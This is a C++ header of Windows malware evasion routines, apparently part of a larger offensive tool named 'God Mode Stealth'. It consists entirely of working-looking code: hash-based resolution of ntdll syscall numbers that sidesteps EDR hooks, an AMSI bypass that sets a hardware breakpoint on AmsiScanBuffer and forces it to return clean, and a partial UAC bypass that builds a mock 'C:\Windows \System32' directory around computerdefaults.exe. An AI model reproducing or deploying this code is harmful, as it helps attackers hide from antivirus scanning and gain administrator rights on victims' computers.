#ifndef GOD_MODE_STEALTH_H
#define GOD_MODE_STEALTH_H

#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include <vector>
#include "api_hashes.h"

static WORD GetSSN(uint32_t hash) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return 0;

    PBYTE pFunc = (PBYTE)ResolveApiByHash(hNtdll, hash);
    if (!pFunc) return 0;

    if (pFunc[0] == 0x4C && pFunc[1] == 0x8B && pFunc[2] == 0xD1 && pFunc[3] == 0xB8) {
        return *(WORD*)(pFunc + 4);
    }

    if (pFunc[0] == 0xE9) {
        for (WORD idx = 1; idx <= 500; idx++) {
            PBYTE pNeighbor = pFunc + (idx * 32);
            if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B && pNeighbor[2] == 0xD1 && pNeighbor[3] == 0xB8) {
                return *(WORD*)(pNeighbor + 4) - idx;
            }
            pNeighbor = pFunc - (idx * 32);
            if (pNeighbor[0] == 0x4C && pNeighbor[1] == 0x8B && pNeighbor[2] == 0xD1 && pNeighbor[3] == 0xB8) {
                return *(WORD*)(pNeighbor + 4) + idx;
            }
        }
    }

    return 0;
}

static LONG CALLBACK HardwareBreakpointHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        ExceptionInfo->ContextRecord->Rax = 0; 
        ExceptionInfo->ContextRecord->Rip = *(DWORD64*)(ExceptionInfo->ContextRecord->Rsp);
        ExceptionInfo->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static BOOL BypassAMSI_HWBP() {
    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return FALSE;

    void* pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return FALSE;

    AddVectoredExceptionHandler(1, HardwareBreakpointHandler);

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();

    if (GetThreadContext(hThread, &ctx)) {
        ctx.Dr0 = (DWORD64)pAmsiScanBuffer;
        ctx.Dr7 |= (1 << 0);
        ctx.Dr7 &= ~(3 << 16); 
        ctx.Dr7 &= ~(3 << 18); 

        SetThreadContext(hThread, &ctx);
        return TRUE;
    }

    return FALSE;
}

static BOOL BypassUAC_MockDir(const wchar_t* payloadPath) {
    wchar_t mockDir[] = L"\\\\?\\C:\\Windows \\";
    wchar_t mockSystem32[] = L"\\\\?\\C:\\Windows \\System32";
    
    if (!CreateDirectoryW(mockDir, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) return FALSE;
    if (!CreateDirectoryW(mockSystem32, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) return FALSE;

    wchar_t targetExe[] = L"\\\\?\\C:\\Windows \\System32\\computerdefaults.exe";
    CopyFileW(L"C:\\Windows\\System32\\computerdefaults.exe", targetExe, FALSE);
    
    return TRUE; 
}

#endif
